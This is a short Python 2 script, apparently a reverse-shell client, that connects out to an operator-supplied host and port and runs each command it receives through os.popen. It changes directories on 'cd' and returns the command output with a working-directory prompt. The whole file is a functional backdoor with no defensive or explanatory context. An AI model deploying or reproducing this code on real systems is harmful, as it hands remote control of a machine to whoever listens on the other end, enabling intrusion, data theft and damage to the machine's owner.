import socket
import sys
import os

arguments = sys.argv

if __name__ == "__main__":
	if not len(arguments) == 3:
		print "[!] Error: Invalid Arguments"
		print "Usage: python client.py host port"
		sys.exit(0)

	host = arguments[1]
	try:
		port = int(arguments[2])
	except Exception as error:
		print "[!] Error: Port should be an integer"
		sys.exit(0)

	try:
		socketObj = socket.socket()
		socketObj.connect((host, port))
		socketObj.send(os.getcwd()+'>')
	except Exception as error:
		print "[!] Error: " + str(error)
		sys.exit(0)

	while True:
		data = socketObj.recv(1024)
		# Process command and send reply back
		if len(data) > 0:
			if str(data[:2]) == 'cd':
				os.chdir(str(data[3:]))
				socketObj.send(str(os.getcwd()) + '>')
			else:
				response = os.popen(data).read()
				socketObj.send(response + str(os.getcwd()) + '>')

	socketObj.close()


